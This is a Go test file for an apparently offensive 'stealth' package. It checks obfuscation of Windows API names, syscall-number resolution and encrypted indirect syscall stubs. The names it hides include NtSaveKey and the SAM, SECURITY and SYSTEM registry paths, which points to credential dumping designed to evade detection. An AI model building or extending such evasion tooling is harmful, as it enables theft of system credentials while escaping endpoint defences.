package stealth

import (
	"testing"
)

func TestEncodeDecode(t *testing.T) {
	key := byte(0x5A)
	s := "NtOpenKey"
	enc := Encode(s, key)
	dec := DecodeStack(enc, key)
	if string(dec) != s {
		t.Errorf("decode mismatch: %q != %q", string(dec), s)
	}
	SecureZero(dec)
	if dec[0] != 0 {
		t.Error("expected zeroed after SecureZero")
	}
}

func TestDecodedHelper(t *testing.T) {
	s := NtdllName()
	if s != "ntdll.dll" {
		t.Errorf("expected ntdll.dll, got %q", s)
	}
	if NtOpenKeyName() != "NtOpenKey" {
		t.Errorf("expected NtOpenKey, got %q", NtOpenKeyName())
	}
}

func TestResolver(t *testing.T) {
	r := NewResolver()
	ssn, err := r.Resolve("NtOpenKey")
	if err != nil {
		t.Fatalf("resolve failed: %v", err)
	}
	if ssn != 0x0019 {
		t.Errorf("expected 0x0019, got 0x%04x", ssn)
	}
	// Cached
	ssn2, _ := r.Resolve("NtOpenKey")
	if ssn != ssn2 {
		t.Error("cached ssn mismatch")
	}
	_, err = r.Resolve("UnknownSyscall")
	if err == nil {
		t.Error("expected error for unknown")
	}
}

func TestIndirectStub(t *testing.T) {
	seed := byte(0xAA)
	plain, enc := BuildIndirectStub(0x0019, seed)
	if len(plain) == 0 || len(enc) == 0 {
		t.Fatal("stub empty")
	}
	dec := DecryptStub(enc, seed)
	if string(dec) != string(plain) {
		t.Error("decrypt mismatch")
	}
	// Check plain contains syscall instruction (0x0F 0x05)
	found := false
	for i := 0; i < len(plain)-1; i++ {
		if plain[i] == 0x0f && plain[i+1] == 0x05 {
			found = true
			break
		}
	}
	if !found {
		t.Error("plain stub missing syscall")
	}
}

func TestSeed(t *testing.T) {
	s1 := Seed()
	s2 := Seed()
	if s1 != s2 {
		t.Error("seed should be stable")
	}
	if s1 == 0 {
		t.Error("seed should not be zero")
	}
}

func TestNoPlaintextInvariant(t *testing.T) {
	sensitiveNames := []string{
		"ntdll.dll", "NtOpenKey", "NtClose", "NtSaveKey",
		"NtCreateFile", "NtAllocateVirtualMemory",
		"NtProtectVirtualMemory", "NtQuerySystemInformation",
		"\\Registry\\Machine\\SYSTEM", "\\Registry\\Machine\\SAM",
		"\\Registry\\Machine\\SECURITY", "\\Registry\\Machine\\SOFTWARE",
	}

	// Encode all names with the current seed
	encoded := make([][]byte, len(sensitiveNames))
	for i, name := range sensitiveNames {
		encoded[i] = Encode(name, 0)
	}

	// Verify: decoded matches original
	for i, name := range sensitiveNames {
		dec := DecodeStack(encoded[i], Seed())
		if string(dec) != name {
			t.Errorf("round-trip failed for %q", name)
		}
		SecureZero(dec)
	}
}

func TestStubBytesDecode(t *testing.T) {
	// Build stub for NtOpenKey (SSN 0x0019)
	plain, enc := BuildIndirectStub(0x0019, 0x42)
	dec := DecryptStub(enc, 0x42)

	// Verify preamble: mov r10, rcx (4C 8B D1)
	if dec[0] != 0x4C || dec[1] != 0x8B || dec[2] != 0xD1 {
		t.Errorf("preamble: got %02X %02X %02X, want 4C 8B D1", dec[0], dec[1], dec[2])
	}
	// Verify mov eax opcode
	if dec[3] != 0xB8 {
		t.Errorf("mov eax opcode: got %02X, want B8", dec[3])
	}
	// Verify SSN bytes
	ssnByte := uint16(dec[4]) | uint16(dec[5])<<8
	if ssnByte != 0x0019 {
		t.Errorf("SSN: got 0x%04X, want 0x0019", ssnByte)
	}
	// Verify syscall
	if dec[8] != 0x0F || dec[9] != 0x05 {
		t.Errorf("syscall: got %02X %02X, want 0F 05", dec[8], dec[9])
	}
	// Verify ret
	if dec[10] != 0xC3 {
		t.Errorf("ret: got %02X, want C3", dec[10])
	}
	// Ensure plain matches
	if len(plain) != len(dec) {
		t.Errorf("length mismatch: plain=%d dec=%d", len(plain), len(dec))
	}
}

func TestResolverFixtureSSNMap(t *testing.T) {
	r := NewResolver()
	expected := map[string]uint16{
		"NtOpenKey":                0x0019,
		"NtClose":                  0x000F,
		"NtAllocateVirtualMemory":  0x0018,
		"NtProtectVirtualMemory":   0x0050,
		"NtSaveKey":                0x0100,
		"NtCreateFile":             0x0052,
		"NtQuerySystemInformation": 0x0036,
	}
	for name, want := range expected {
		got, err := r.Resolve(name)
		if err != nil {
			t.Errorf("Resolve(%q) error: %v", name, err)
			continue
		}
		if got != want {
			t.Errorf("Resolve(%q) = 0x%04X, want 0x%04X", name, got, want)
		}
	}
}
